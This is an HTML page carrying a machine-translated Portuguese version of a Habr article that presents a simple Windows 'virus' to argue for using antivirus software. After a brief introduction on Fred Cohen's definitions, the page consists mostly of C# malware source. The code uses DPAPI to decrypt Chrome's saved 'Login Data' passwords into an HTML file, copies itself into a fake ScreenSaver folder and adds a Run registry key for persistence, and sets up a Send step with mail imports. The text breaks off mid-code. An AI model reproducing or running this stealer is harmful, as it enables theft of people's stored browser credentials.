<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚öñÔ∏è üëø üë®‚Äç‚úàÔ∏è V√≠rus b√°sico em 20 minutos ou por que voc√™ deve usar antiv√≠rus üßõüèΩ üë©üèø‚Äçüéì ü§Æ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sauda√ß√µes. 
 
 Hoje em dia, o limiar para entrar no mundo da programa√ß√£o caiu significativamente - se antes, no in√≠cio da era digital, a programa√ß√£o e...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>V√≠rus b√°sico em 20 minutos ou por que voc√™ deve usar antiv√≠rus</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493942/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sauda√ß√µes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hoje em dia, o limiar para entrar no mundo da programa√ß√£o caiu significativamente - se antes, no in√≠cio da era digital, a programa√ß√£o era algo fora do comum, ‚Äúo destino dos eleitos‚Äù, hoje todo aluno que sabe pesquisar no Google e com confian√ßa pode escrever um keylogger ou worm manuseando um computador. Sem nenhuma habilidade especial, voc√™ pode criar um software que pode causar muitos problemas aos usu√°rios de PC que, por um motivo ou outro, negligenciam programas antiv√≠rus. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Under cat √© um exemplo de como escrever esse malware e algumas reflex√µes sobre por que ele se tornou t√£o acess√≠vel.</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Assim, para iniciantes, formalizamos - que no contexto deste artigo √© considerado sob os conceitos de "v√≠rus" e "worm". </font><font style="vertical-align: inherit;">Formalmente, o conceito de "v√≠rus" foi introduzido pela primeira vez em 1984 por Fred Cohen e parecia assim:</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Definimos um 'v√≠rus' de computador como um programa que pode 'infectar' outros programas, modificando-os para incluir uma c√≥pia possivelmente evolu√≠da de si mesma</font></font></blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais tarde, ele corrigiu sua pr√≥pria defini√ß√£o, concentrando-se na capacidade de se auto-propagar - ou seja, copiar recursivamente o c√≥digo do programa. Assim, em um sentido mais fundamental, o v√≠rus foi definido como um c√≥digo, cuja execu√ß√£o levar√° √† grava√ß√£o de uma c√≥pia desse c√≥digo na fita da m√°quina de Turing antes da execu√ß√£o, ou seja, no futuro. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa defini√ß√£o n√£o est√° totalmente correta em rela√ß√£o aos v√≠rus mais modernos, porque os v√≠rus reais n√£o precisam ser copiados recursivamente e, em geral, copiados, mas esse modelo √© considerado cl√°ssico e √© apropriado us√°-lo para escrever um "v√≠rus esf√©rico no v√°cuo". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al√©m disso, em 1992, em seu </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://web.archive.org/web/20140203201533/" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artigo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cohen introduziu uma defini√ß√£o formal de worm de computador. </font><font style="vertical-align: inherit;">Uma defini√ß√£o formal completa pode ser encontrada na fonte, aqui s√≥ darei uma breve cita√ß√£o:</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recentemente, o termo "worm" tem sido amplamente utilizado para descrever programas que replicam e inicializam automaticamente a interpreta√ß√£o de suas r√©plicas.1 Por outro lado, a defini√ß√£o de v√≠rus abrange todos os programas auto-replicantes, mas n√£o aborda a maneira pela qual as r√©plicas podem ser acionadas. .</font></font></blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa. </font><font style="vertical-align: inherit;">o motivo da execu√ß√£o do worm pode n√£o ser o worm pai, mas de acordo com qualquer gatilho, por exemplo, inicializa√ß√£o ou timer do computador. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De fato, a classifica√ß√£o dos v√≠rus √© muito mais ampla, e cada v√≠rus se enquadra em v√°rias categorias ao mesmo tempo, mesmo os ‚Äútrojans‚Äù t√™m </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mais de uma d√∫zia de esp√©cies</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Isso n√£o √© sobre isso. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos percebendo outro v√≠rus nesta gal√°xia. </font><font style="vertical-align: inherit;">Eu direi imediatamente que ele n√£o funcionar√° em hardware real protegido por um simples antiv√≠rus, mas demonstra claramente os princ√≠pios subjacentes √† maioria dos programas de v√≠rus. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O c√≥digo completo sob o spoiler (com cuidado, existem muitos):</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T√≠tulo de spoiler</font></font></b><div class="spoiler_text"><pre><code class="java hljs">using System;<font></font>
using System.Text;<font></font>
using System.IO;<font></font>
using System.Data.SQLite;<font></font>
using System.Data;<font></font>
using System.Runtime.InteropServices;<font></font>
using System.ComponentModel;<font></font>
using System.Net.Mail;<font></font>
using System.Net;<font></font>
using Microsoft.Win32;<font></font>
using System.Threading;<font></font>
<font></font>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DPAPI</span>
</span>{<font></font>
    [DllImport(<span class="hljs-string">"crypt32.dll"</span>, SetLastError = <span class="hljs-keyword">true</span>, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> extern
    bool <span class="hljs-title">CryptProtectData</span><span class="hljs-params">(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, <span class="hljs-keyword">int</span> dwFlags, ref DATA_BLOB pCipherText)</span></span>;<font></font>
<font></font>
    [DllImport(<span class="hljs-string">"crypt32.dll"</span>, SetLastError = <span class="hljs-keyword">true</span>, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> extern
    bool <span class="hljs-title">CryptUnprotectData</span><span class="hljs-params">(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
    IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, <span class="hljs-keyword">int</span> dwFlags, ref DATA_BLOB pPlainText)</span></span>;<font></font>
<font></font>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<font></font>
    internal struct DATA_BLOB<font></font>
    {<font></font>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> cbData;
        <span class="hljs-keyword">public</span> IntPtr pbData;<font></font>
    }<font></font>
<font></font>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<font></font>
    internal struct CRYPTPROTECT_PROMPTSTRUCT<font></font>
    {<font></font>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> cbSize;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> dwPromptFlags;
        <span class="hljs-keyword">public</span> IntPtr hwndApp;
        <span class="hljs-keyword">public</span> string szPrompt;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> IntPtr NullPtr = ((IntPtr)((<span class="hljs-keyword">int</span>)(<span class="hljs-number">0</span>)));<font></font>
<font></font>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> CRYPTPROTECT_UI_FORBIDDEN = <span class="hljs-number">0x1</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> CRYPTPROTECT_LOCAL_MACHINE = <span class="hljs-number">0x4</span>;<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitPrompt</span><span class="hljs-params">(ref CRYPTPROTECT_PROMPTSTRUCT ps)</span>
    </span>{<font></font>
        ps.cbSize = Marshal.SizeOf(<font></font>
        typeof(CRYPTPROTECT_PROMPTSTRUCT));<font></font>
        ps.dwPromptFlags = <span class="hljs-number">0</span>;<font></font>
        ps.hwndApp = NullPtr;<font></font>
        ps.szPrompt = <span class="hljs-keyword">null</span>;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitBLOB</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] data, ref DATA_BLOB blob)</span>
    </span>{
        <span class="hljs-comment">// Use empty array for null parameter.</span>
        <span class="hljs-keyword">if</span> (data == <span class="hljs-keyword">null</span>)<font></font>
            data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];<font></font>
<font></font>
        <span class="hljs-comment">// Allocate memory for the BLOB data.</span><font></font>
        blob.pbData = Marshal.AllocHGlobal(data.Length);<font></font>
<font></font>
        <span class="hljs-comment">// Make sure that memory allocation was successful.</span>
        <span class="hljs-keyword">if</span> (blob.pbData == IntPtr.Zero)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
            <span class="hljs-string">"Unable to allocate data buffer for BLOB structure."</span>);<font></font>
<font></font>
        <span class="hljs-comment">// Specify number of bytes in the BLOB.</span><font></font>
        blob.cbData = data.Length;<font></font>
<font></font>
        <span class="hljs-comment">// Copy data from original source to the BLOB structure.</span>
        Marshal.Copy(data, <span class="hljs-number">0</span>, blob.pbData, data.Length);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> KeyType { UserKey = <span class="hljs-number">1</span>, MachineKey };<font></font>
<font></font>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> KeyType defaultKeyType = KeyType.UserKey;<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(string plainText)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(defaultKeyType, plainText, String.Empty, String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(keyType, plainText, String.Empty,<font></font>
        String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText, string entropy)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(keyType, plainText, entropy, String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText, string entropy, string description)</span>
    </span>{
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (plainText == <span class="hljs-keyword">null</span>) plainText = String.Empty;
        <span class="hljs-keyword">if</span> (entropy == <span class="hljs-keyword">null</span>) entropy = String.Empty;<font></font>
<font></font>
        <span class="hljs-comment">// Call encryption routine and convert returned bytes into</span>
        <span class="hljs-comment">// a base64-encoded value.</span>
        <span class="hljs-keyword">return</span> Convert.ToBase64String(<font></font>
        Encrypt(keyType,<font></font>
        Encoding.UTF8.GetBytes(plainText),<font></font>
        Encoding.UTF8.GetBytes(entropy),<font></font>
        description));<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] Encrypt(KeyType keyType, <span class="hljs-keyword">byte</span>[] plainTextBytes, <span class="hljs-keyword">byte</span>[] entropyBytes, string description)<font></font>
    {<font></font>
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (plainTextBytes == <span class="hljs-keyword">null</span>) plainTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (entropyBytes == <span class="hljs-keyword">null</span>) entropyBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (description == <span class="hljs-keyword">null</span>) description = String.Empty;<font></font>
<font></font>
        <span class="hljs-comment">// Create BLOBs to hold data.</span>
        DATA_BLOB plainTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB cipherTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB entropyBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
<font></font>
        <span class="hljs-comment">// We only need prompt structure because it is a required</span>
        <span class="hljs-comment">// parameter.</span><font></font>
        CRYPTPROTECT_PROMPTSTRUCT prompt =<font></font>
        <span class="hljs-keyword">new</span> CRYPTPROTECT_PROMPTSTRUCT();<font></font>
        InitPrompt(ref prompt);<font></font>
<font></font>
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <span class="hljs-comment">// Convert plaintext bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(plainTextBytes, ref plainTextBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize plaintext BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Convert entropy bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(entropyBytes, ref entropyBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize entropy BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Disable any types of UI.</span>
            <span class="hljs-keyword">int</span> flags = CRYPTPROTECT_UI_FORBIDDEN;<font></font>
<font></font>
            <span class="hljs-comment">// When using machine-specific key, set up machine flag.</span>
            <span class="hljs-keyword">if</span> (keyType == KeyType.MachineKey)<font></font>
                flags |= CRYPTPROTECT_LOCAL_MACHINE;<font></font>
<font></font>
            <span class="hljs-comment">// Call DPAPI to encrypt data.</span><font></font>
            bool success = CryptProtectData(ref plainTextBlob,<font></font>
            description,<font></font>
            ref entropyBlob,<font></font>
            IntPtr.Zero,<font></font>
            ref prompt,<font></font>
            flags,<font></font>
            ref cipherTextBlob);<font></font>
            <span class="hljs-comment">// Check the result.</span>
            <span class="hljs-keyword">if</span> (!success)<font></font>
            {<font></font>
                <span class="hljs-comment">// If operation failed, retrieve last Win32 error.</span>
                <span class="hljs-keyword">int</span> errCode = Marshal.GetLastWin32Error();<font></font>
<font></font>
                <span class="hljs-comment">// Win32Exception will contain error message corresponding</span>
                <span class="hljs-comment">// to the Windows error code.</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"CryptProtectData failed."</span>, <span class="hljs-keyword">new</span> Win32Exception(errCode));<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Allocate memory to hold ciphertext.</span>
            <span class="hljs-keyword">byte</span>[] cipherTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[cipherTextBlob.cbData];<font></font>
<font></font>
            <span class="hljs-comment">// Copy ciphertext from the BLOB to a byte array.</span><font></font>
            Marshal.Copy(cipherTextBlob.pbData,<font></font>
            cipherTextBytes,<font></font>
            <span class="hljs-number">0</span>,<font></font>
            cipherTextBlob.cbData);<font></font>
<font></font>
            <span class="hljs-comment">// Return the result.</span>
            <span class="hljs-keyword">return</span> cipherTextBytes;<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
        {<font></font>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"DPAPI was unable to encrypt data."</span>, ex);<font></font>
        }<font></font>
        <span class="hljs-comment">// Free all memory allocated for BLOBs.</span>
        <span class="hljs-keyword">finally</span><font></font>
        {<font></font>
            <span class="hljs-keyword">if</span> (plainTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(plainTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (cipherTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(cipherTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (entropyBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(entropyBlob.pbData);<font></font>
        }<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText)</span>
    </span>{<font></font>
        string description;<font></font>
<font></font>
        <span class="hljs-keyword">return</span> Decrypt(cipherText, String.Empty, out description);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText, out string description)</span>
    </span>{
        <span class="hljs-keyword">return</span> Decrypt(cipherText, String.Empty, out description);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText, string entropy, out string description)</span>
    </span>{
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (entropy == <span class="hljs-keyword">null</span>) entropy = String.Empty;<font></font>
<font></font>
        <span class="hljs-keyword">return</span> Encoding.UTF8.GetString(<font></font>
        Decrypt(Convert.FromBase64String(cipherText),<font></font>
        Encoding.UTF8.GetBytes(entropy),<font></font>
        out description));<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] Decrypt(<span class="hljs-keyword">byte</span>[] cipherTextBytes, <span class="hljs-keyword">byte</span>[] entropyBytes, out string description)<font></font>
    {<font></font>
        <span class="hljs-comment">// Create BLOBs to hold data.</span>
        DATA_BLOB plainTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB cipherTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB entropyBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
<font></font>
        <span class="hljs-comment">// We only need prompt structure because it is a required</span>
        <span class="hljs-comment">// parameter.</span><font></font>
        CRYPTPROTECT_PROMPTSTRUCT prompt =<font></font>
        <span class="hljs-keyword">new</span> CRYPTPROTECT_PROMPTSTRUCT();<font></font>
        InitPrompt(ref prompt);<font></font>
<font></font>
        <span class="hljs-comment">// Initialize description string.</span><font></font>
        description = String.Empty;<font></font>
<font></font>
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <span class="hljs-comment">// Convert ciphertext bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(cipherTextBytes, ref cipherTextBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize ciphertext BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Convert entropy bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(entropyBytes, ref entropyBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize entropy BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Disable any types of UI. CryptUnprotectData does not</span>
            <span class="hljs-comment">// mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of</span>
            <span class="hljs-comment">// supported flags so we will not set it up.</span>
            <span class="hljs-keyword">int</span> flags = CRYPTPROTECT_UI_FORBIDDEN;<font></font>
<font></font>
            <span class="hljs-comment">// Call DPAPI to decrypt data.</span><font></font>
            bool success = CryptUnprotectData(ref cipherTextBlob,<font></font>
            ref description,<font></font>
            ref entropyBlob,<font></font>
            IntPtr.Zero,<font></font>
            ref prompt,<font></font>
            flags,<font></font>
            ref plainTextBlob);<font></font>
<font></font>
            <span class="hljs-comment">// Check the result.</span>
            <span class="hljs-keyword">if</span> (!success)<font></font>
            {<font></font>
                <span class="hljs-comment">// If operation failed, retrieve last Win32 error.</span>
                <span class="hljs-keyword">int</span> errCode = Marshal.GetLastWin32Error();<font></font>
<font></font>
                <span class="hljs-comment">// Win32Exception will contain error message corresponding</span>
                <span class="hljs-comment">// to the Windows error code.</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"CryptUnprotectData failed."</span>, <span class="hljs-keyword">new</span> Win32Exception(errCode));<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Allocate memory to hold plaintext.</span>
            <span class="hljs-keyword">byte</span>[] plainTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[plainTextBlob.cbData];<font></font>
<font></font>
            <span class="hljs-comment">// Copy ciphertext from the BLOB to a byte array.</span><font></font>
            Marshal.Copy(plainTextBlob.pbData,<font></font>
            plainTextBytes,<font></font>
            <span class="hljs-number">0</span>,<font></font>
            plainTextBlob.cbData);<font></font>
<font></font>
            <span class="hljs-comment">// Return the result.</span>
            <span class="hljs-keyword">return</span> plainTextBytes;<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
        {<font></font>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"DPAPI was unable to decrypt data."</span>, ex);<font></font>
        }<font></font>
        <span class="hljs-comment">// Free all memory allocated for BLOBs.</span>
        <span class="hljs-keyword">finally</span><font></font>
        {<font></font>
            <span class="hljs-keyword">if</span> (plainTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(plainTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (cipherTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(cipherTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (entropyBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(entropyBlob.pbData);<font></font>
        }<font></font>
    }<font></font>
}<font></font>
<font></font>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Chrome</span>
</span>{<font></font>
<font></font>
    <span class="hljs-keyword">static</span> string filename = <span class="hljs-string">"passwords.html"</span>;
    <span class="hljs-keyword">static</span> string db_way = <span class="hljs-string">"Login Data"</span>; <span class="hljs-comment">//    </span><font></font>
<font></font>
    <span class="hljs-keyword">static</span> string wayToDir = @<span class="hljs-string">"Screens\";
    static string wayToScreen;
    static string finalDir = @"</span>C:\<span class="hljs-function">Program <span class="hljs-title">Files</span> <span class="hljs-params">(x86)</span>\Windows\ScreenSaver\"</span>;
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">(string[] args)</span>
    </span>{<font></font>
        <font></font>
        Registr();<font></font>
        Thread.Sleep(<span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);<font></font>
        Generate();<font></font>
        Send();<font></font>
     <font></font>
    }<font></font>
   <font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Registr</span><span class="hljs-params">()</span>
    </span>{<font></font>
        string way = Environment.GetCommandLineArgs()[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <font></font>
<font></font>
            <span class="hljs-keyword">if</span> (!Directory.Exists(finalDir))<font></font>
            {<font></font>
                Directory.CreateDirectory(finalDir);<font></font>
                foreach (string iter in Directory.GetFiles(Environment.CurrentDirectory))<font></font>
                {<font></font>
                   <span class="hljs-comment">// Console.WriteLine(iter);</span>
                    string nameOfFile = iter.Split(<span class="hljs-string">'\\'</span>)[iter.Split(<span class="hljs-string">'\\'</span>).Length - <span class="hljs-number">1</span>];
                    <span class="hljs-comment">//Console.WriteLine(nameOfFile);</span>
                    File.Copy(iter, finalDir + nameOfFile, <span class="hljs-keyword">true</span>);<font></font>
                }<font></font>
                Directory.CreateDirectory(finalDir + <span class="hljs-string">"x64"</span>);<font></font>
                Directory.CreateDirectory(finalDir + <span class="hljs-string">"x86"</span>);<font></font>
                File.Copy(Environment.CurrentDirectory + <span class="hljs-string">"\\x64\\SQLite.Interop.dll"</span>, finalDir + <span class="hljs-string">"\\x64\\SQLite.Interop.dll"</span>);<font></font>
                File.Copy(Environment.CurrentDirectory + <span class="hljs-string">"\\x86\\SQLite.Interop.dll"</span>, finalDir + <span class="hljs-string">"\\x86\\SQLite.Interop.dll"</span>);<font></font>
<font></font>
<font></font>
                <span class="hljs-keyword">const</span> string name = <span class="hljs-string">"SoftWare"</span>;<font></font>
                string ExePath = finalDir + <span class="hljs-string">"soft.exe"</span>;<font></font>
                File.Copy(way, ExePath, <span class="hljs-keyword">true</span>);<font></font>
                RegistryKey reg;<font></font>
                reg = Registry.CurrentUser.CreateSubKey(<span class="hljs-string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"</span>);
                <span class="hljs-keyword">try</span><font></font>
                {<font></font>
                    reg.SetValue(name, ExePath);<font></font>
                    reg.Close();<font></font>
                }<font></font>
                <span class="hljs-keyword">catch</span><font></font>
                {   }<font></font>
            }<font></font>
<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span><font></font>
        {   }<font></font>
    }<font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Generate</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            string way_to_original = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + <span class="hljs-string">"\\Google\\Chrome\\User Data\\Default\\Login Data"</span>;<font></font>
            File.Copy(way_to_original, <span class="hljs-string">"Login Data"</span>, <span class="hljs-keyword">true</span>);<font></font>
<font></font>
            StreamWriter Writer = <span class="hljs-keyword">new</span> StreamWriter(filename, <span class="hljs-keyword">false</span>, Encoding.UTF8);<font></font>
<font></font>
            string db_field = <span class="hljs-string">"logins"</span>; <span class="hljs-comment">//  </span>
            <span class="hljs-keyword">byte</span>[] entropy = <span class="hljs-keyword">null</span>; <span class="hljs-comment">//    .</span>
                                   <span class="hljs-comment">//  DPAPI      ,</span>
